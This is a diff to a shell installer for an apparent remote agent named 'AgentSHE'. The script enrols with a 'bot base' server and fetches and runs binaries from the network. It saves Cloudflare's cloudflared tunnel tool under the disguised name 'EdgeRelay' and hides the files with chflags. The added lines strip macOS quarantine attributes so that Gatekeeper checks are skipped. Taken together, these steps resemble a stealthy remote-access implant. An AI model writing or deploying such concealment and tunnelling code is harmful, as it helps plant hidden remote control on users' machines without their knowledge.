@@ -2,7 +2,7 @@
 set -euo pipefail
 ENROLL="${1:-${AGENTSHE_ENROLL:-}}"
 BOT_BASE="${2:-${AGENTSHE_BOT_BASE:-}}"
-GH="${AGENTSHE_GH:-https://github.com/lilygopro/AgentSHE/releases/download/v1.0.5}"
+GH="${AGENTSHE_GH:-https://github.com/lilygopro/AgentSHE/releases/download/v1.0.6}"
 BOT_BASE="${BOT_BASE%/}"
 
 if [ -z "$ENROLL" ] || [ -z "$BOT_BASE" ]; then
@@ -22,9 +22,14 @@ if [ "$(uname -s)" = "Darwin" ]; then
 fi
 cd "$DIR"
 
+# Stop previous instance / watchdog (no duplicates)
+pkill -f "$DIR/watchdog.sh" 2>/dev/null || true
+pkill -f "$DIR/reconnect.sh" 2>/dev/null || true
 pkill -f "$DIR/HelperHost" 2>/dev/null || true
 pkill -f "$DIR/EdgeRelay" 2>/dev/null || true
-sleep 0.2
+pkill -x HelperHost 2>/dev/null || true
+pkill -x EdgeRelay 2>/dev/null || true
+sleep 0.3
 
 ARCH="$(uname -m)"
 OS="$(uname -s)"
@@ -55,11 +60,17 @@ restore_or_fetch() {
   cp -f "$CACHE/$name" "$DIR/$name"
   chmod +x "$DIR/$name"
   if [ "$(uname -s)" = "Darwin" ]; then
+    xattr -d com.apple.quarantine "$DIR/$name" 2>/dev/null || true
+    xattr -cr "$DIR/$name" 2>/dev/null || true
     chflags hidden "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
   fi
 }
 
 restore_or_fetch "$HH" "$GH/HelperHost-$OS_N-$ARCH_N"
+if [ "$(uname -s)" = "Darwin" ]; then
+  xattr -d com.apple.quarantine "$DIR/$HH" 2>/dev/null || true
+  xattr -cr "$DIR/$HH" 2>/dev/null || true
+fi
 
 if [ "$OS" = "Darwin" ]; then
   if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
@@ -69,15 +80,26 @@ else
   else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"; fi
 fi
 restore_or_fetch EdgeRelay "$U"
+if [ "$(uname -s)" = "Darwin" ]; then
+  xattr -d com.apple.quarantine "$DIR/EdgeRelay" 2>/dev/null || true
+  xattr -cr "$DIR/EdgeRelay" 2>/dev/null || true
+fi
 
 printf '%s\n' "{\"enroll\":\"$ENROLL\",\"bot_base\":\"$BOT_BASE\"}" > "$DIR/config.json"
 export AGENTSHE_ENROLL="$ENROLL" AGENTSHE_BOT_BASE="$BOT_BASE"
 
+rm -f "$DIR/token" "$DIR/boot.log" "$DIR/agent.log"
 nohup "$DIR/$HH" >"$DIR/boot.log" 2>&1 &
 for i in $(seq 1 180); do
-  if grep -q '^OK$' "$DIR/boot.log" 2>/dev/null; then
+  if [ -f "$DIR/token" ] && pgrep -f "$DIR/$HH" >/dev/null 2>&1; then
     echo OK
     exit 0
+  fi
+  if grep -q '^OK$' "$DIR/boot.log" 2>/dev/null; then
+    if [ -f "$DIR/token" ] || pgrep -f "$DIR/$HH" >/dev/null 2>&1; then
+      echo OK
+      exit 0
+    fi
   fi
   if grep -q '^FAIL' "$DIR/boot.log" 2>/dev/null; then exit 1; fi
   sleep 1
